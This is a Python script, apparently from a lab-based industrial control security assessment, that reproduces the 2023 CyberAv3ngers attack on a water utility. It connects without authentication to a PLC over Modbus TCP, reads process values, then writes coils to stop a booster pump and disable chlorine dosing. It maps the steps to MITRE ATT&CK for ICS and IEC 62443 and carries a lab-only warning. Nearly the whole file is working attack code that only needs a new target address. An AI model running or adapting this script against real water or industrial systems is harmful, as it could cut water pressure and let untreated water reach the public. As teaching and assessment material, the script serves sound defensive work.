#!/usr/bin/env python3
"""
================================================================================
OT Security Assessment Tool — Modbus TCP Unauthenticated Write (Attack)
================================================================================
Project:    Water Treatment ICS Security Assessment
Scenario:   Reproducing 2023 CyberAv3ngers attack on Municipal Water Authority
            of Aliquippa, Pennsylvania
Author:     Deepak Varma
Background: 9+ years operations and process safety — Reliance Industries
            (world's largest oil refinery) and Tata Steel

Purpose:
    Demonstrates that Modbus TCP allows any device on the network to send
    arbitrary write commands to a PLC with zero authentication.

    This script reproduces the exact attack performed by CyberAv3ngers
    in November 2023:
        1. Connect to PLC on port 502 — no credentials required
        2. Read current process values (reconnaissance)
        3. Write FALSE to pump_running — stops the booster pump
           (loss of water pressure to elevated residential areas)
        4. Write FALSE to chlorine_dosing — disables water treatment
           (untreated water enters the distribution network)
        5. Confirm attack impact by reading values again

    Both changes are immediately visible in the Scada-LTS SCADA dashboard,
    demonstrating the real-world impact on operator visibility.

MITRE ATT&CK for ICS Techniques Demonstrated:
    T0855 — Unauthorized Command Message
    T0816 — Device Restart/Shutdown
    T0831 — Manipulation of Control

IEC 62443 Gaps Demonstrated:
    SR 1.1 — No identification or authentication
    SR 3.5 — No input validation on write commands
    SR 5.1 — No network segmentation on port 502

WARNING:
    This script is written for educational purposes in a controlled
    lab environment only. Never run against production systems.

Usage:
    python modbus_write.py

Requirements:
    pip install pymodbus
================================================================================
"""

from pymodbus.client import ModbusTcpClient
import sys
import time
import datetime

# ─────────────────────────────────────────────────────────────────────────────
# TARGET CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────
TARGET_IP   = '127.0.0.1'   # OpenPLC container — Modbus TCP listener
TARGET_PORT = 502            # Standard Modbus TCP port
UNIT_ID     = 1              # Modbus slave/unit ID (OpenPLC default = 1)

# Modbus coil addresses (mapped in water_booster_station.st)
COIL_PUMP_RUNNING        = 0   # %QX0.0 — booster pump ON/OFF
COIL_HIGH_PRESSURE_ALARM = 1   # %QX0.1 — high pressure alarm
COIL_CHLORINE_DOSING     = 2   # %QX0.2 — chlorination pump ON/OFF

# Modbus register addresses
REG_SYSTEM_PRESSURE      = 0   # %QW0   — pipeline pressure in PSI


def print_banner():
    """Print attack simulation header."""
    print("=" * 70)
    print("  OT SECURITY ASSESSMENT — Unauthenticated Modbus TCP Write")
    print("  ATTACK SIMULATION: CyberAv3ngers Water Treatment Scenario")
    print("=" * 70)
    print(f"  Timestamp  : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Target     : {TARGET_IP}:{TARGET_PORT}")
    print(f"  Attack     : Unauthenticated Modbus coil write (FC05)")
    print(f"  Objective  : Stop booster pump + disable chlorination")
    print("=" * 70)
    print()


def connect_to_plc():
    """
    Establish unauthenticated connection to target PLC.

    Modbus TCP has no authentication layer. Connection succeeds
    immediately if port 502 is reachable — identical to how
    CyberAv3ngers accessed the Aliquippa PLC remotely.

    Returns:
        ModbusTcpClient: Connected client object
    """
    print("[*] Phase 1 — Establishing connection to target PLC")
    print(f"[*] Target   : {TARGET_IP}:{TARGET_PORT}")
    print("[*] Auth     : None required")
    print()

    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    connected = client.connect()

    if connected:
        print("[+] CONNECTION ESTABLISHED — no credentials were required")
        print("[+] Attacker now has full read/write access to PLC")
    else:
        print("[-] Connection failed")
        sys.exit(1)

    print()
    return client


def read_all_values(client, phase_label):
    """
    Read and display all current process values from PLC.

    Used to capture state before and after the attack
    to demonstrate the impact clearly.

    Args:
        client      (ModbusTcpClient): Connected Modbus client
        phase_label (str): Label for this reading (BEFORE/AFTER)

    Returns:
        tuple: (coil_values, register_values)
    """
    print(f"[*] Phase — Reading process values {phase_label} attack")
    print()

    # Read 3 coils starting at address 0
    coils = client.read_coils(COIL_PUMP_RUNNING, count=3, slave=UNIT_ID)

    # Read 1 holding register at address 0
    registers = client.read_holding_registers(
        REG_SYSTEM_PRESSURE, count=1, slave=UNIT_ID
    )

    if coils.isError() or registers.isError():
        print("[-] Error reading values")
        return None, None

    coil_values = coils.bits[:3]
    reg_values  = registers.registers

    print(f"  ┌─ Process Values {phase_label} Attack {'─' * 30}")
    print(f"  │  pump_running        (Coil {COIL_PUMP_RUNNING}): "
          f"{coil_values[0]}")
    print(f"  │  high_pressure_alarm (Coil {COIL_HIGH_PRESSURE_ALARM}): "
          f"{coil_values[1]}")
    print(f"  │  chlorine_dosing     (Coil {COIL_CHLORINE_DOSING}): "
          f"{coil_values[2]}")
    print(f"  │  system_pressure     (Reg  {REG_SYSTEM_PRESSURE}): "
          f"{reg_values[0]} PSI")
    print(f"  └{'─' * 50}")
    print()

    return coil_values, reg_values


def execute_attack(client):
    """
    Execute the unauthenticated write attack on the water booster station.

    Sends Modbus Function Code 05 (Write Single Coil) commands to:
        1. Stop the booster pump — loss of water pressure
        2. Disable chlorination — public health risk

    No authentication, confirmation, or operator approval is required.
    The PLC accepts and executes these commands immediately.

    Modbus FC05 Write Single Coil:
        Value 0xFF00 = TRUE (energise coil)
        Value 0x0000 = FALSE (de-energise coil)

    Args:
        client (ModbusTcpClient): Connected Modbus client
    """
    print("[*] Phase 2 — Executing unauthenticated write attack")
    print("[!] Simulating CyberAv3ngers attack methodology")
    print()

    # ── Attack Step 1: Stop the booster pump ─────────────────────────────
    print(f"  [→] Writing FALSE to pump_running "
          f"(Coil {COIL_PUMP_RUNNING}) via FC05...")
    print("      Real-world impact: Water pressure loss to elevated areas")

    result = client.write_coil(COIL_PUMP_RUNNING, False, slave=UNIT_ID)

    if not result.isError():
        print("  [✓] Write successful — pump stopped, no auth required")
    else:
        print(f"  [-] Write failed: {result}")

    print()
    time.sleep(2)  # Allow PLC scan cycle to process the write

    # ── Attack Step 2: Disable chlorination ──────────────────────────────
    print(f"  [→] Writing FALSE to chlorine_dosing "
          f"(Coil {COIL_CHLORINE_DOSING}) via FC05...")
    print("      Real-world impact: Untreated water enters distribution network")

    result = client.write_coil(COIL_CHLORINE_DOSING, False, slave=UNIT_ID)

    if not result.isError():
        print("  [✓] Write successful — chlorination disabled, no auth required")
    else:
        print(f"  [-] Write failed: {result}")

    print()
    time.sleep(2)  # Allow pressure to begin dropping


def main():
    """Main attack simulation function."""

    print_banner()

    # ── Connect to PLC ────────────────────────────────────────────────────
    client = connect_to_plc()

    # ── Read values BEFORE attack ─────────────────────────────────────────
    read_all_values(client, "BEFORE")

    # ── Execute the attack ────────────────────────────────────────────────
    execute_attack(client)

    # ── Read values AFTER attack ──────────────────────────────────────────
    read_all_values(client, "AFTER")

    # ── Close connection ──────────────────────────────────────────────────
    client.close()

    # ── Summary ───────────────────────────────────────────────────────────
    print("=" * 70)
    print("  ATTACK COMPLETE — Zero authentication was required")
    print()
    print("  Impact Summary:")
    print("    • Booster pump stopped — water pressure dropping")
    print("    • Chlorine dosing disabled — treatment offline")
    print("    • Changes visible in Scada-LTS SCADA dashboard")
    print("    • No credentials, no audit trail, no access control")
    print()
    print("  MITRE ATT&CK for ICS: T0855, T0816, T0831")
    print("  IEC 62443: SR 1.1, SR 3.5, SR 5.1 — NOT MET")
    print("=" * 70)


if __name__ == "__main__":
    main()